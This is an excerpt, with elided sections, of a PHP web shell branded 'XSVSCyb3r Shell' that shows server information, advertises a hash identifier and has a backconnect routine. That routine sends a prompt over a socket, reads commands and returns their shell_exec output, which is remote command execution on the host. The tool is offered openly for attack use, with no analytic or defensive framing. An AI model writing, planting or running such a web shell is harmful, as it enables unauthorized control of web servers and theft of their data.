...
<body>
  <div id="main_content">
    ...
    echo "<title>.:: XSVSCyb3r Shell ::.</title>";

    function get_srv_info() {

      echo "<br /><span id='title'>XSVSCyb3r Shell</span><br /><div class='box'><b>Server Name : </b>".$_SERVER["SERVER_NAME"]."<br />
    ...
    if (strstr($CurrentUrl, "readfile")) {
      ...
      get_srv_info();
      echo "<p>XSVSCyb3r hash identifier is able to identify MD5, SHA-1, MySQL5, DES(Unix), SHA-256, SHA-384, SHA-512, MD5(Unix), MD5(APR), MD5(phpBB3), MD5(Wordpress), SHA-256(Unix), SHA-512(Unix) and MD5(Base-64).</p>";
      ...
      if (isset($_POST['bind'])) {
        ...
        if ($errno != 0) {
          ...
          fputs ($sockfd, "\n{################################################################}\n..:: XSVSCyb3r Shell ::..\n\n=> Backconnect \n=> Back	\n
            ...
            $cmdPrompt = '[BSHT]#:> '; fputs ($sockfd, $cmdPrompt); $command = fgets($sockfd, $len);
            fputs($sockfd, "\n" . shell_exec($command) . "\n\n");
          } fclose($sockfd);
        }}
      echo "</p></div>";
...
<form action="" method="post">
  ...
  <form action="" method="post">
    ...
    echo "
		<h4>Information</h4>
		<p>XSVSCyb3r Shell v".$shellVersion." Open Beta Edition - coded by XSVSCyb3r below are the known issues and bugs.</p>";
    ...
    <br /><br /><br /><br /><div class='Logo'>
      XSVSCyb3r v<?php echo $shellVersion; ?>
    </div>
    <div class='logotext'>
      XSVSCyb3r Shell Coded By XSVSCyb3r
    </div>
    <br /><br /><br />
    <?php
  }
